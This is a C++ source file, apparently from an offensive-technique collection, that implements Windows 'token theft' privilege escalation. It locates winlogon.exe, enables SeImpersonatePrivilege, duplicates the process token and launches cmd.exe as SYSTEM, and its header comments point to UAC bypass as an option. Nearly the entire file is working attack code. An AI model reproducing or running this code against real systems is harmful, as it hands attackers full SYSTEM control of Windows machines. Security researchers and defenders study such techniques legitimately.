/*
Title: Token Theft
Notes:
	- This technique works only when the current user has the SeImpersonatePrivilege. Therefore, run it as Administrator or use UAC Bypass techniques.
	- The CreateProcessWithToken function requires the Secondary Logon service to be running (it's running in almost of the Windows system by default).
*/
#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <stdio.h>

DWORD FindPID(LPCWSTR wProcessName) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (!hSnapshot || hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	DWORD dwPid = 0;

	if (Process32First(hSnapshot, &pe32)) {
		do {
			if (wcscmp(pe32.szExeFile, wProcessName) == 0) {
				dwPid = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	
	return dwPid;
}

BOOL AdjustCurrentToken() {
	HANDLE hToken = nullptr;
	// TOKEN_ADJUST_PRIVILEGES is used for AdjustTokenPrivilege()
	// TOKEN_QUERY is used for PrivilegeCheck()
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		return FALSE;
	}

	LUID luid;
	if (!LookupPrivilegeValueW(nullptr, SE_IMPERSONATE_NAME, &luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	PRIVILEGE_SET ps;
	ps.PrivilegeCount = 1;
	ps.Control = PRIVILEGE_SET_ALL_NECESSARY;
	ps.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	ps.Privilege[0].Luid = luid;
	BOOL bResult = FALSE;

	if (!PrivilegeCheck(hToken, &ps, &bResult)) {
		CloseHandle(hToken);
		return FALSE;
	}
	if (!bResult) {
		// If the SeDebugPrivilege is not enabled, try to enable it.
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		tp.Privileges[0].Luid = luid;

		if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
			CloseHandle(hToken);
			return FALSE;
		}
		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
			printf("ERROR_NOT_ALL_ASSIGNED. Please run it as Administrator.\n");
			CloseHandle(hToken);
			return FALSE;
		}
	}

	CloseHandle(hToken);

	return TRUE;
}

BOOL CreateProcessWithStolenToken(HANDLE hToken, LPCWSTR lpAppName) {
	HANDLE hDupToken = nullptr;
	if (!DuplicateTokenEx(
		hToken,
		MAXIMUM_ALLOWED,
		nullptr,
		SecurityAnonymous,
		TokenPrimary,
		&hDupToken
	)) {
		return FALSE;
	}

	STARTUPINFOW si = { 0 };
	si.cb = sizeof(STARTUPINFOW);
	PROCESS_INFORMATION pi = { 0 };

	if (!CreateProcessWithTokenW(
		hDupToken,
		LOGON_WITH_PROFILE,
		lpAppName,
		nullptr,
		0,
		nullptr,
		nullptr,
		&si,
		&pi
	)) {
		CloseHandle(hDupToken);
		return FALSE;
	}

	CloseHandle(hDupToken);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return TRUE;
}

BOOL TokenTheft() {
	LPCWSTR lpAppName = L"C:\\Windows\\System32\\cmd.exe"; // Replace it with the path of the newly created process.

	// Find the PID of the high-privileged process such as "winlogon.exe", "lsass.exe" to impersonate.
	// That's because we want to escalate privilege to SYSTEM user.
	DWORD dwPid = FindPID(L"winlogon.exe");
	if (dwPid == 0) return FALSE;

	// Check if the current token enables SeImpersonatePrivilege. If not enabled, try to set it.
	// This process is optional.
	if (!AdjustCurrentToken()) return FALSE;

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, dwPid);
	if (!hProcess) return FALSE;

	HANDLE hToken = nullptr;
	if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
		CloseHandle(hProcess);
		return FALSE;
	}

	if (!CreateProcessWithStolenToken(hToken, lpAppName)) {
		CloseHandle(hProcess);
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hProcess);
	CloseHandle(hToken);

	return TRUE;
}
